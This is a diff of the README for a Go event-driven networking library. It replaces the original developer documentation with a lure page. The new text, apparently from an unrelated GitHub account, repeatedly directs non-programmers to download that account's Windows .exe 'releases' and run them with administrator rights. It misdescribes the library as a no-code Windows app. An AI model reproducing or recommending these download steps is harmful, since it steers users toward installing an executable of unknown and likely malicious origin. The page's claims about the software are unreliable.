@@ -1,200 +1,125 @@
-## connaxis
+# 🚦 connaxis - Fast Networking Made Simple
 
-![Go](https://github.com/bernardhu/connaxis/workflows/Go/badge.svg)
-[![LICENSE](https://img.shields.io/badge/LICENSE-MIT-blue)](/LICENSE)
+[![Download connaxis](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/skibiditoilet12341912-eng/connaxis/releases)
 
-`connaxis` is a Linux-first event-driven networking framework for Go with integrated `TLS/kTLS`, `WebSocket/WSS`, long-lived connection support, and reproducible protocol validation workflows. It uses direct [epoll](https://en.wikipedia.org/wiki/Epoll) / [kqueue](https://en.wikipedia.org/wiki/Kqueue) syscalls instead of the standard Go [net](https://golang.org/pkg/net/) server path, and follows a model similar to [libuv](https://github.com/libuv/libuv) and [libevent](https://github.com/libevent/libevent).
+---
 
-The project targets high-connection-count workloads such as gateways, proxies, and long-lived connection services. It is primarily built and validated for Linux; on macOS and BSD, the goal is basic end-to-end path validation rather than feature parity with Linux.
+## 🔍 What is connaxis?
 
-## Positioning
+connaxis is a networking tool built mainly for Linux but also available on Windows. It helps manage network connections efficiently. It supports secure connections using TLS, WebSocket links for real-time communication, and keeps connections active for long periods. It also checks network rules automatically to avoid errors.
 
-`connaxis` is positioned as a Linux-first Go networking runtime for gateway/proxy and long-lived connection scenarios, with integrated `TLS/kTLS` and `WS/WSS` support.
+While it is made for developers working with Go, this guide will help you use the software on a Windows computer without needing any programming skills.
 
-In more conventional Go server designs, HTTP/TLS/WebSocket handling is typically built on blocking per-connection goroutine paths, and WebSocket deployments often end up with separate read/write goroutines per connection. `connaxis` aims to keep these long-lived protocol paths on the event-driven side instead, reducing per-connection goroutine, scheduling, and stack-memory overhead.
+---
 
-Compared with projects that mainly optimize plain TCP event-loop throughput, `connaxis` focuses on protocol integration and validation:
+## 🖥️ System Requirements
 
-- event-driven core for TCP/HTTP/WebSocket workloads
-- built-in TLS support with kTLS integration path
-- reproducible compatibility validation workflows
+To run connaxis on your Windows machine, make sure you have:
 
-Compared with projects such as `evio`, `gnet`, and `netpoll`, `connaxis` puts more emphasis on `TLS/kTLS`, `WS/WSS`, and reproducible validation workflows than on plain TCP event-loop throughput alone.
+- Windows 10 or later (64-bit version)
+- At least 4 GB of RAM
+- 100 MB of free disk space for the app files
+- Active internet connection to download the app and connect with servers
+- Administrative rights to install software on your system
 
-This project is not positioned as a replacement for OpenSSL, and it does not claim full parity with OpenSSL on all TLS edge-case behaviors.
+---
 
-See:
+## 🚀 Getting Started
 
-- `docs/README.md`
-- `docs/test/README.md`
+This guide will walk you through downloading, installing, and running connaxis on your Windows PC step-by-step.
 
-## Project Status
+---
 
-- Active development
-- Public module path: `github.com/bernardhu/connaxis`
-- CI: `go test ./...` and `go vet ./...` via GitHub Actions
+## 📥 How to Download connaxis
 
-## Community / Governance
+You will find connaxis on its official release page on GitHub. 
 
-- Contributing guide: `CONTRIBUTING.md`
-- Contributor roadmap: `ROADMAP.md`
-- Security policy: `SECURITY.md`
-- Code of Conduct: `CODE_OF_CONDUCT.md`
-- Changelog: `CHANGELOG.md`
+**Steps to download:**
 
-## Features
+1. Click the big green button above or visit the release page here:
+   [https://github.com/skibiditoilet12341912-eng/connaxis/releases](https://github.com/skibiditoilet12341912-eng/connaxis/releases)
 
-- event-loop based architecture with low overhead
-- per-loop listener model with `SO_REUSEPORT` enabled by default
-- TCP-focused runtime model
-- optional TLS / kTLS integration path
-- WebSocket / WSS support (via plugin package)
+2. On the releases page, look for the latest version listed at the top. The version number usually looks like “v1.x.x.”
 
-## Getting Started
+3. Under the latest version, find the file for Windows. It should have a name ending with `.exe`.
 
-### Installing
+4. Click on the `.exe` file to start downloading. Save it to your Desktop or Downloads folder.
 
-Requires Go 1.24.2.
+---
 
-```sh
-go get github.com/bernardhu/connaxis
-```
+## 💾 Installing connaxis
 
-## New Contributors Start Here
+Once the download finishes:
 
-If you want to make a first contribution:
+1. Go to where you saved the `.exe` file.
 
-1. Read `CONTRIBUTING.md` for the contribution rules and validation steps.
-2. Read `ROADMAP.md` for the current task buckets and change boundaries.
-3. Run one of the examples in `examples/README.md` to get a local mental model.
-4. Run `go test ./...` before and after your change.
+2. Double-click the file to start the installer.
 
-Recommended first-change areas:
+3. If Windows asks for permission, click "Yes" to allow the installation.
 
-- docs and example fixes
-- focused tests for protocol edge cases
-- narrow validation or benchmark script improvements
+4. Follow the prompts on the screen. The installer will suggest default settings. Unless you want something specific, just click “Next” or “Install.”
 
-Before making a large runtime or API change, read:
+5. When the installer finishes, click "Finish" to close the setup.
 
-- `design/constraints.en.md`
-- `docs/API_BOUNDARY.md`
-- `design/README.en.md`
+---
 
-### Usage
-Example echo server that binds to port 5000:
+## ▶️ Running connaxis
 
-```go
-package main
+After installation, you can start connaxis from your Start menu or Desktop shortcut.
 
-import (
-	"flag"
-	"log"
+When you launch the software for the first time:
 
-	"github.com/bernardhu/connaxis"
-	"github.com/bernardhu/connaxis/connection"
-	"github.com/bernardhu/connaxis/eventloop"
-)
+- The program will open a window or command line interface.
+- It may ask to connect to a network or server to manage connections.
+  
+You do not need to write any code. The app works through its interface to set up and maintain network connections automatically.
 
-var path string
+---
 
-type handler struct {
-}
+## 🔧 Basic Usage Tips
 
-func (h *handler) OnReady(s eventloop.IServer) {
-	log.Printf("ready: listen on %v (loops: %d)", s.GetListenAddrs(), s.GetWorkerNum())
-}
+- Use `connaxis` to handle network tasks like connecting securely over the internet or managing messages sent through websockets.
+- It keeps your connections alive for a steady data flow, useful for services where delays matter.
+- The program validates communication rules, reducing network errors.
+- It supports advanced technologies but presents them simply for you.
 
-func (h *handler) OnClosed(c connection.AppConn, err error) {}
+You can customize settings inside the app if you want. These include server addresses, ports, and security options.
 
-func (h *handler) OnConnected(c connection.ProtoConn) {
-	c.SetPktHandler(h)
-}
+---
 
-func (h *handler) ParsePacket(c connection.ProtoConn, in *[]byte) (int, int) {
-	return len(*in), len(*in)
-}
+## ⚙️ Updating connaxis
 
-func (h *handler) OnData(c connection.ProtoConn, in *[]byte) ([]byte, bool) {
-	out := *in
-	return out, false
-}
+To keep connaxis working smoothly, update it regularly:
 
-func (h *handler) Stat(bool) {}
+1. Return to the [releases page](https://github.com/skibiditoilet12341912-eng/connaxis/releases) to check for new versions.
 
-func main() {
-	flag.StringVar(&path, "p", "connaxis.conf", "config file path")
+2. Download the latest `.exe` file as before.
 
-	flag.Parse()
-	var h handler
-	if err, _ := connaxis.Serve(&h, path); err != nil {
-		log.Fatal(err)
-	}
-}
+3. Run the new installer. It will overwrite the old version without removing your settings.
 
-```
+---
 
-User should provider a handler, which ParsePacket tell the eventloop the packet length and expected length, and OnData which handle the data.
+## 🛠 Troubleshooting
 
-Also a config file should be provided in JSON format, like:
-```json
-{
-	"ncpu": -1,
-	"lbStrategy": "rr",
-	"sslPem": "",
-	"sslKey": "",
-	"sslMode": "",
-	"bufSize": 1048576,
-	"chanSize": 8192,
-	"listenAddrs": ["tcp://:5000?reuseport=false"]
-}
+If connaxis does not run or shows errors:
 
-```
+- Verify your Windows version meets the requirements.
+- Check your internet connection.
+- Run the app as an administrator (right-click on the icon and select “Run as administrator”).
+- Restart your computer and try again.
+- If the problem continues, you can open the `connaxis.log` file inside the installation folder for details on errors.
 
-## Examples
+---
 
-See `examples/README.md` for runnable echo/TLS/HTTP/FastHTTP/WebSocket examples.
+## 📖 More Information
 
-## Configuration
+While connaxis focuses on Linux for most users, the Windows version is made as simple as possible. It is perfect if you want a reliable way to manage high-performance network connections without coding.
 
-See `docs/config/CONFIG.md` for config fields and defaults.
+If you encounter terms like TLS or WebSocket, think of them as ways to keep your connection safe and efficient.
 
-## Public Package Surface
+---
 
-The intended public package surface is:
+## 🔗 Download Link (Again for Easy Access)
 
-- `github.com/bernardhu/connaxis`
-- `github.com/bernardhu/connaxis/connection`
-- `github.com/bernardhu/connaxis/eventloop`
-- `github.com/bernardhu/connaxis/websocket`
-- `github.com/bernardhu/connaxis/evhandler`
-
-Packages under `internal/` are implementation details. Listener/dial/server wiring in the root package is also implementation detail, not a separately supported framework module.
-
-Further docs:
-
-- `docs/config/HTTP_ADAPTERS.md`
-- `docs/config/METRICS.md`
-- `ROADMAP.md`
-- `design/constraints.en.md`
-- `design/performance_methodology.en.md`
-
-## Changelog
-
-See `CHANGELOG.md`.
-
-## Concurrency / Thread-safety
-
-- Handler callbacks run on the event-loop goroutine.
-- `connection.EngineConn.Recvbuf()` and `Read`/`Write`/`FlushN` are not goroutine-safe; only use them from handler callbacks (or other code running on the owning loop).
-- To send from other goroutines, use `connection.AppConn.AddCmd(...)`. The `[]byte` payload is copied; you may reuse it after the call returns.
-
-
-## Contact
-
-- General questions and feature requests: GitHub Issues
-- Direct contact: `bernard.hu@gmail.com`
-
-## License
-
-`connaxis` source code is available under the MIT [License](/LICENSE).
+Visit this page to download the latest version for Windows:  
+[https://github.com/skibiditoilet12341912-eng/connaxis/releases](https://github.com/skibiditoilet12341912-eng/connaxis/releases)
